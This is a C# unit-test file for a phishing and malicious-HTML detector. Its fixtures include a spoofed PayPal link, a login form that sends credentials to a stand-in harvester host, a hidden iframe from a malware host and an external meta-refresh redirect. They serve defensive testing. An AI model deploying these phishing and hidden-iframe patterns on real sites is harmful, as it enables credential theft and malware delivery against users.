using LinkSafetyChecker.Models;
using LinkSafetyChecker.Services;
using Microsoft.Extensions.Logging.Abstractions;
using Xunit;

namespace LinkSafetyChecker.Tests;

public class DomInspectionCheckerTests
{
    private readonly DomInspectionChecker _checker;

    public DomInspectionCheckerTests()
    {
        _checker = new DomInspectionChecker(NullLogger<DomInspectionChecker>.Instance);
    }

    [Fact]
    public async Task InspectAsync_DetectsDeceptiveAnchorSpoofing()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <p>Please log in here: <a href='https://evil-attacker.com/login'>https://paypal.com/signin</a></p>
</body>
</html>";

        var baseUri = new Uri("https://evil-attacker.com");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.True(result.IsAnalyzed);
        Assert.Equal(1, result.DeceptiveAnchorsFound);
        Assert.Contains(result.Findings, f => f.FindingType == "DECEPTIVE_ANCHOR_SPOOFING");
    }

    [Fact]
    public async Task InspectAsync_DoesNotFlagLegitimateAnchorMatch()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <p>Official site: <a href='https://paypal.com/signin'>https://paypal.com/signin</a></p>
    <p>Subdomain link: <a href='https://help.paypal.com'>paypal.com help</a></p>
</body>
</html>";

        var baseUri = new Uri("https://paypal.com");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.True(result.IsAnalyzed);
        Assert.Equal(0, result.DeceptiveAnchorsFound);
    }

    [Fact]
    public async Task InspectAsync_DetectsCredentialStealingFormAction()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <form action='https://attacker-harvester.net/collect.php' method='POST'>
        <input type='text' name='username' />
        <input type='password' name='password' />
        <button type='submit'>Sign In</button>
    </form>
</body>
</html>";

        var baseUri = new Uri("https://legitimate-bank.com/login");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.Equal(1, result.RiskyFormsFound);
        Assert.Contains(result.Findings, f => f.FindingType == "CREDENTIAL_STEALING_FORM");
    }

    [Fact]
    public async Task InspectAsync_DoesNotFlagSameDomainFormAction()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <form action='/api/auth/login' method='POST'>
        <input type='password' name='password' />
        <button type='submit'>Sign In</button>
    </form>
</body>
</html>";

        var baseUri = new Uri("https://mycompany.com");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.Equal(0, result.RiskyFormsFound);
    }

    [Fact]
    public async Task InspectAsync_DetectsSuspiciousHiddenIframe()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <iframe src='https://malware-distributor.info/silent-drop' style='display:none;' width='0' height='0'></iframe>
</body>
</html>";

        var baseUri = new Uri("https://compromised-site.com");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.Equal(1, result.HiddenIframesFound);
        Assert.Contains(result.Findings, f => f.FindingType == "SUSPICIOUS_HIDDEN_IFRAME");
    }

    [Fact]
    public async Task InspectAsync_WhitelistsLegitimateCaptchasAndWidgets()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <!-- Google reCAPTCHA and Cloudflare Turnstile iframes -->
    <iframe src='https://www.google.com/recaptcha/api2/anchor?k=somekey' style='display:none;' width='0' height='0'></iframe>
    <iframe src='https://challenges.cloudflare.com/cdn-cgi/challenge-platform/h/g/turnstile' style='display:none;'></iframe>
    <iframe src='https://js.stripe.com/v3/fingerprinted' style='visibility:hidden;'></iframe>
</body>
</html>";

        var baseUri = new Uri("https://safe-shop.com");
        var result = await _checker.InspectAsync(html, baseUri);

        // All 3 are whitelisted providers, so none should be flagged as suspicious
        Assert.Equal(0, result.HiddenIframesFound);
    }

    [Fact]
    public async Task InspectAsync_DetectsMetaRefreshExternalRedirect()
    {
        var html = @"
<!DOCTYPE html>
<html>
<head>
    <meta http-equiv='refresh' content='0; url=https://external-scam.xyz/landing'>
</head>
<body>Redirecting...</body>
</html>";

        var baseUri = new Uri("https://example.com");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.Contains(result.Findings, f => f.FindingType == "META_REFRESH_EXTERNAL_REDIRECT");
    }

    [Fact]
    public async Task InspectAsync_WhitelistsGoogleTagManagerNoscriptIframe()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <!-- Google Tag Manager (noscript) -->
    <noscript><iframe src=""https://www.googletagmanager.com/ns.html?id=GTM-XXXXX"" height=""0"" width=""0"" style=""display:none;visibility:hidden""></iframe></noscript>
    <!-- End Google Tag Manager (noscript) -->
    <p>Welcome to our university portal</p>
</body>
</html>";

        var baseUri = new Uri("https://uct.ac.za");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.True(result.IsAnalyzed);
        Assert.Equal(0, result.HiddenIframesFound);
        Assert.DoesNotContain(result.Findings, f => f.FindingType == "SUSPICIOUS_HIDDEN_IFRAME");
    }

    [Fact]
    public async Task InspectAsync_WhitelistsAnalyticsAndFacebookPixel()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <iframe src='https://www.google-analytics.com/analytics.html' style='display:none;' width='0' height='0'></iframe>
    <iframe src='https://analytics.google.com/collector' style='display:none;' width='0' height='0'></iframe>
    <iframe src='https://connect.facebook.net/en_US/fbevents.js' style='display:none;' width='0' height='0'></iframe>
    <iframe src='https://ad.doubleclick.net/activity' style='display:none;' width='0' height='0'></iframe>
</body>
</html>";

        var baseUri = new Uri("https://legit-store.com");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.Equal(0, result.HiddenIframesFound);
        Assert.DoesNotContain(result.Findings, f => f.FindingType == "SUSPICIOUS_HIDDEN_IFRAME");
    }

    [Fact]
    public async Task InspectAsync_DoesNotPenalizeNoscriptTagOnEducationalDomain()
    {
        var html = @"
<!DOCTYPE html>
<html>
<body>
    <noscript>
        <iframe src='https://tracking.adnetwork.com/tag' style='display:none;' width='0' height='0'></iframe>
    </noscript>
    <h1>University Department Page</h1>
</body>
</html>";

        var baseUri = new Uri("https://cs.wits.ac.za");
        var result = await _checker.InspectAsync(html, baseUri);

        Assert.Equal(0, result.HiddenIframesFound);
    }
}

